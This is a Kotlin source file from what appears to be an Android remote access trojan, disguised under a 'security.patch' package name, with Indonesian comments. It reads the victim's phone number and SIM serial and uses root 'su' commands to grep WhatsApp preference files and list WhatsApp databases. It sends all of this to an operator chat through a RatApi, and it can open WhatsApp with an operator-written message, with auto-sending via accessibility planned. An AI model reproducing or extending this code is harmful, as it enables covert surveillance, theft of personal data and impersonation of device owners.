package com.android.security.patch.commands

import android.content.Context
import android.content.Intent
import android.net.Uri
import com.android.security.patch.RatApi
import java.io.File

object WA {

    fun getNumber(ctx: Context, chatId: Long) {
        RatApi.sendMessage(ctx, "reading wa number...", chatId)
        Thread {
            val sb = StringBuilder("<b>📱 WA number</b>\n")
            try {
                // 1. telephony
                try {
                    val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                    @Suppress("DEPRECATION")
                    val num = tm.line1Number
                    if (!num.isNullOrBlank()) sb.append("telephony: <code>$num</code>\n")
                    else sb.append("telephony: (kosong)\n")
                } catch (_: Throwable) { sb.append("telephony: n/a\n") }

                // 2. SIM
                try {
                    val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                    val simNum = tm.simSerialNumber ?: "?"
                    sb.append("sim serial: <code>$simNum</code>\n")
                } catch (_: Throwable) {}

                // 3. WA prefs (root)
                val waPaths = listOf(
                    "/data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml",
                    "/data/data/com.whatsapp/shared_prefs/WA_Prefs.xml",
                    "/data/data/com.whatsapp.w4b/shared_prefs/com.whatsapp_preferences.xml",
                    "/data/user/0/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml"
                )
                for (p in waPaths) {
                    val num = grepNumber(p)
                    if (num != null) {
                        sb.append("WA prefs: <code>$num</code>  (from ${p.split("/")[3]})\n")
                    }
                }

                // 4. DB path
                try {
                    val c = ProcessBuilder("su", "-c",
                        "ls /data/data/com.whatsapp/databases/ 2>/dev/null | head -20")
                        .redirectErrorStream(true).start()
                    val out = c.inputStream.bufferedReader().readText()
                    c.waitFor()
                    if (out.isNotBlank()) sb.append("\n<b>databases:</b>\n<pre>${out}</pre>")
                } catch (_: Throwable) {}

                RatApi.sendMessage(ctx, sb.toString(), chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "wa number err: ${e.message}", chatId)
            }
        }.start()
    }

    private fun grepNumber(path: String): String? {
        try {
            val c = ProcessBuilder("su", "-c",
                "grep -oE '[0-9]{8,15}' \"$path\" 2>/dev/null | sort -u | head -5")
                .redirectErrorStream(true).start()
            val out = c.inputStream.bufferedReader().readText().trim()
            c.waitFor()
            if (out.isBlank()) return null
            return out.replace("\n", ", ")
        } catch (_: Throwable) { return null }
    }

    fun send(ctx: Context, chatId: Long, args: Array<String>) {
        if (args.size < 2) {
            RatApi.sendMessage(ctx, "usage: /wa 6281234567890 pesan di sini", chatId); return
        }
        val num = args[0].replace(Regex("[^0-9]"), "")
        val msg = args.drop(1).joinToString(" ")
        if (num.length < 8) {
            RatApi.sendMessage(ctx, "nomor gak valid", chatId); return
        }
        val uri = Uri.parse("https://wa.me/$num?text=${Uri.encode(msg)}")
        val intent = Intent(Intent.ACTION_VIEW, uri).apply {
            setPackage("com.whatsapp")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        try {
            ctx.startActivity(intent)
            RatApi.sendMessage(ctx, "WA dibuka dengan pesan pre-filled. auto-send via accessibility:\nkalau tombol send ke-detect, langsung kirim.", chatId)
            // TODO auto-tap send button via accessibility (butuh event listener)
        } catch (e: Throwable) {
            try {
                val i2 = Intent(Intent.ACTION_VIEW, uri).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(i2)
                RatApi.sendMessage(ctx, "WA opened (fallback)", chatId)
            } catch (e2: Throwable) {
                RatApi.sendMessage(ctx, "wa err: ${e.message}", chatId)
            }
        }
    }
}
